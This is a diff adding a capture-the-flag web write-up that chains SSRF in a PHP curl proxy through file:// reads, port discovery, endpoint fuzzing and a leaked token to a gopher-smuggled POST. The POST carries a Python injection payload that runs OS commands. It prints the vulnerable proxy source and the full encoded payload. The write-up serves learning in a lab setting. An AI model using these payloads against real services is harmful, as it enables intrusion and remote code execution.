@@ -966,3 +966,359 @@ Running it works
 ![done2](done2.png)
 ![done3](done3.png)
 
+The instances are down so i can't do it remotely xD
+
+### Proxy as a Service
+
+- **Challenge Name** : Proxy as a Service
+- **Description** :
+
+```description
+We made a proxy so users can fetch resource of any URL they want.
+
+Although no current web design in place 😉
+```
+
+- **author** : h4cky0u
+- **solves** : 7/17
+
+#### Enumeration
+
+This challenge doesn't provide the source code, just a single url that when we access shows this
+
+![proxy1](proxy1.png)
+
+No UI haha, i was too lazy to make anything...even with AI lol.
+
+But yeah, we need to make a `POST` request with body `key=url`
+
+Hop on `Burp Suite` repeater to ease making request.
+
+I first made a web request to a webhook site
+
+![proxy2](proxy2.png)
+![proxy3](proxy3.png)
+
+This suggests that the application is using a backend HTTP client (e.g., libcurl or a similar library, as indicated by the server header showing PHP/8.5.5).
+
+Such clients typically support multiple URL schemes, including `http`, `ftp`, `file`, `gopher`, and others, depending on configuration.
+
+By using the `file://` scheme, it may be possible to read local files on the filesystem, provided the scheme is not restricted and the target files have appropriate read permissions.
+
+Testing that works:
+
+![proxy4](proxy4.png)
+
+We need to first leak the application source code possibly there may be other routes aside this `SSRF`.
+
+Doing that leaks the source code but it doesn't contain anything as shown:
+
+![proxy5](proxy5.png)
+
+```php
+<?php
+
+// Gotta add some designs.. uhh i hate web dev smh
+
+if (!isset($_POST['url'])) {
+    die("Send a POST request with url");
+}
+
+$url = $_POST['url'];
+
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_ALL);
+curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_ALL);
+curl_setopt($ch, CURLOPT_HEADER, true);
+
+$response = curl_exec($ch);
+
+if ($response === false) {
+    echo curl_error($ch);
+    exit;
+}
+
+echo $response;
+
+?>
+```
+
+We can also try to fuzz for `php or flag` files, but that's not necessary because `curl_init` can read files in a directory.
+
+![proxy6](proxy6.png)
+
+What now?
+
+Well, if you check `/etc/hosts` you'd get this
+
+![proxy7](proxy7.png)
+
+```
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::	ip6-localnet
+ff00::	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+127.0.0.1	internal.api
+172.25.0.2	881f80fe9ac7
+```
+
+It seems there's an internal api running on `127.0.0.1`
+
+Although we don't know the port it's running on.
+
+With `SSRF`, we can fuzz the port as so: `http://internal.api:FUZZ`
+
+But because we also have file read, we can simply read `/proc/net/tcp`.
+
+![proxy8](proxy8.png)
+
+```
+sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
+0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 214562 1 0000000000000000 100 0 0 10 0                    
+1: 0100007F:2328 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 207598 1 0000000000000000 100 0 0 10 0                    
+2: 0B00007F:911D 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 212452 2 0000000000000000 100 0 0 10 0                    
+3: 020019AC:0050 010019AC:A3A0 01 00000000:00000000 02:000AFC7F 00000000    33        0 225611 2 0000000000000000 20 4 30 10 -1                   
+```
+
+Line 2:
+
+```
+1: 0100007F:2328 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 207598 1 0000000000000000 100 0 0 10 0                    
+```
+
+The address is in its hexadecimal notation, same as the port.
+
+Converting it properly we get: `127.0.0.1:9000`.
+
+Now when we access it, the result is this
+
+![proxy9](proxy9.png)
+
+You might think of simply reading the source code to this API as it runs on `127.0.0.1`, but the `internal api` service runs in a separate container, meaning its filesystem is isolated and cannot be accessed through the SSRF primitive.
+
+Here's the `docker-compose.yml` file
+
+```yml
+version: '3'
+
+services:
+  proxy:
+    image: php:8-apache
+    volumes:
+      - ./proxy:/var/www/html
+    ports:
+      - "8181:80"
+    extra_hosts:
+      - "internal.api:127.0.0.1"
+
+  internal:
+    build: ./internal
+    network_mode: "service:proxy"
+```
+
+The `internal` container does not have its own network stack. It shares the same network namespace as `proxy`.
+
+Since it's an api, we can go ahead to fuzz for some endpoints.
+
+It mentioned `API v1.0` so in our fuzz we can try `/api/v1/FUZZ`.
+
+Here's the request file:
+
+```
+POST / HTTP/1.1
+Host: localhost:8181
+sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+url=http:///internal.api:9000/api/v1/FUZZ
+```
+
+I used `ffuf`, you can use any tool of your choice.
+
+![proxy10](proxy10.png)
+
+```bash
+mark@rwx:~/Desktop/CTFs/Csean26/Web/Proxy$ ffuf -request req.txt -request-proto http -w /usr/share/Seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -fs 47,389
+```
+
+With fuzzing, we recover 4 endpoints
+
+```
+info                    [Status: 200, Size: 757, Words: 31, Lines: 9, Duration: 23ms]
+flag                    [Status: 200, Size: 202, Words: 18, Lines: 9, Duration: 65ms]
+ping                    [Status: 200, Size: 290, Words: 14, Lines: 9, Duration: 77ms]
+compute                 [Status: 200, Size: 349, Words: 20, Lines: 9, Duration: 86ms]
+```
+
+Accesing `/info` reveals the structure of the API.
+
+![proxy11](proxy11.png)
+![proxy12](proxy12.png)
+
+```json
+{
+  "auth": {
+    "header": "API-Token-Header",
+    "type": "API Key"
+  },
+  "debug": {
+    "last_token_used": "SuperSecretApiToken1337",
+    "note": "Internal requests bypass IP restrictions"
+  },
+  "description": "Internal microservice for computation",
+  "endpoints": [
+    {
+      "description": "Health check endpoint",
+      "method": "GET",
+      "path": "/api/v1/ping"
+    },
+    {
+      "description": "Service metadata",
+      "method": "GET",
+      "path": "/api/v1/info"
+    },
+    {
+      "description": "Flag endpoint",
+      "method": "GET",
+      "path": "/api/v1/flag"
+    },
+    {
+      "description": "Compute expressions (requires API key)",
+      "method": [
+        "GET",
+        "POST"
+      ],
+      "path": "/api/v1/compute"
+    }
+  ],
+  "name": "Internal API",
+  "version": "1.0"
+}
+```
+
+If you access `/flag` you get trolled haha:
+
+```json
+{"flag":"hahahaha no flag for you"}
+```
+
+The `/ping` endpoint doesn't do much.
+
+```json
+{"client_ip":"127.0.0.1","message":"pong","server":"881f80fe9ac7","status":"ok","timestamp":"2026-05-27T18:36:50.934541Z"}
+```
+
+We're left with `/compute`, checking the description it says it would compute expressions but we need to pass the `API key`.
+
+We can authenticate using the `API-Token-Header` header.
+
+The token is also leaked: `SuperSecretApiToken1337`.
+
+Accessing `/compute` via a `GET` request returns this:
+
+```json
+{
+  "description": "Performs mathematical computations",
+  "name": "Compute API",
+  "requires": "API Key",
+  "usage": {
+    "body": {
+      "expr": "string (Python expression)"
+    },
+    "method": "POST"
+  },
+  "version": "1.0"
+}
+```
+
+This smells like a `Python Code Injection (the server runs on Wergzeug)`...
+
+So we need to make a post request with json body like this:
+
+```json
+{
+    "expr": "1+1"
+}
+```
+
+And header:
+
+```
+API-Token-Header: SuperSecretApiToken1337
+```
+
+#### Exploitation
+
+How do we send the server a `POST` request when it seems we can only do a `GET` request via the `SSRF`?
+
+Well, you can make use of the `Gopher` scheme.
+
+The [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme can be used to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.
+
+Assuming we want to authenticate to a login page on `attacker.com` at `/login.php`, we can send the following `POST` request:
+
+```
+POST /login.php HTTP/1.1
+Host: attacker.com
+Content-Length: 30
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=admin
+```
+
+We need to URL-encode all special characters to construct a valid gopher URL from this. 
+
+In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded. Afterward, we need to prefix the data with the gopher URL scheme, the target `host` and `port`, and an `underscore`, resulting in the following gopher URL:
+
+```
+gopher://attacker.com:80/_POST%20/login.php%20HTTP%2F1.1%0D%0AHost:%20attacker.com%0D%0AContent-Length:%2030%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Ausername%3Dadmin%26password%3Dadmin
+```
+
+In our case, we want to do this
+
+```
+POST /api/v1/compute HTTP/1.1
+Host: internal.api:9000
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+API-Token-Header: SuperSecretApiToken1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 14
+Content-Type: application/json;charset=UTF-8
+
+{"expr":"__import__('os').popen('id').read()"}
+```
+
+Converting that to a proper gopher URL we should get this:
+
+```
+gopher%3a//internal.api%3a9000/_POST%2520/api/v1/compute%2520HTTP/1.1%250D%250AHost%253A%2520internal.api%253A9000%250D%250AAPI-Token-Header%253A%2520SuperSecretApiToken1337%250D%250AAccept-Language%253A%2520en-US%252Cen%253Bq%253D0.9%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528X11%253B%2520Linux%2520x86_64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/145.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%252C%2520br%250D%250AConnection%253A%2520keep-alive%250D%250AContent-Length%253A%252046%250D%250AContent-Type%253A%2520application/json%253Bcharset%253DUTF-8%250D%250A%250D%250A{"expr"%3a"__import__('os').popen('id').read()"}
+```
+
+Doing that, we should get code execution:
+
+![proxy13](proxy13.png)
+
+From this we can simply just read the flag at `/flag.txt`
+
+ありがとうございます！😊
